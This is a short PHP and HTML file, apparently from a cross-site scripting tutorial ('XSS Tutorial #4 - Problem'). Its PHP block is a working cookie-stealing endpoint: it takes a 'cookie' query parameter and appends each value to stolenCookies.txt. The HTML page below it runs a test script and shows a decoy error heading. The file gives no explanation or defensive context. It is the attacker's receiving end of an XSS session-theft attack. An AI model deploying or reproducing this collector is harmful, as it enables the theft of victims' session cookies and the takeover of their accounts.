<?php

if (isset($_GET['cookie']))
{
	$file = 'stolenCookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}

?>
<!DOCTYPE html>
<html>
<head>
	<title> XSS Tutorial #4 - Problem </title>
	<script type="text/javascript">
		alert("injected");
		console.log("works");
	</script>
</head>
<body>
<h1 align="center"> Oh No! Something went wrong! </h1>
</body>
</html> 